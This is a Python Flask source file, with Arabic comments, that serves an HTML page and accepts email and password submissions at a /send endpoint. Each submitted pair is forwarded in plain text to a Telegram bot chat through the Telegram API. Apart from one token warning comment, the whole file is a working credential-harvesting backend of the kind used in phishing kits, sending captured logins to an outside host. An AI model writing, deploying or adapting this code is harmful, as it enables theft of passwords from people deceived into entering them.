# app.py
import os
import requests
from flask import Flask, request, jsonify, render_template_string
from dotenv import load_dotenv

load_dotenv()  # لو تستخدمين ملف .env أثناء التطوير

app = Flask(__name__)

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")  # ضع التوكن في متغير بيئي
CHAT_ID = os.getenv("CHAT_ID")

# خيار: لو حابة تخدمي ال index.html مباشرة من Flask:
with open("index.html", "r", encoding="utf-8") as f:
    INDEX_HTML = f.read()

@app.route("/", methods=["GET"])
def index():
    # يعيد صفحة الـ HTML (أو استعملي render_template لو عندك templates)
    return render_template_string(INDEX_HTML)

@app.route('/send', methods=['POST'])
def send_to_telegram():
    if not TELEGRAM_TOKEN or not CHAT_ID:
        return jsonify({"status": "error", "message": "Telegram credentials not configured"}), 500

    data = request.get_json(silent=True) or {}
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()

    # تحقق بسيط
    if not email or not password:
        return jsonify({"status": "error", "message": "email and password required"}), 400

    # **تحذير أمني**: لا ترسلي كلمات مرور حقيقية إلى خدمات خارجية في الإنتاج
    message = f"Email: {email}\nPassword: {password}"

    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }

    try:
        resp = requests.post(url, json=payload, timeout=10)
        resp.raise_for_status()
    except requests.RequestException as e:
        return jsonify({"status": "error", "message": str(e)}), 502

    return jsonify({"status": "sent"})

if __name__ == "__main__":
    # اختاري host="0.0.0.0" فقط لو تحتاجين الوصول من أجهزة أخرى
    app.run(debug=True)
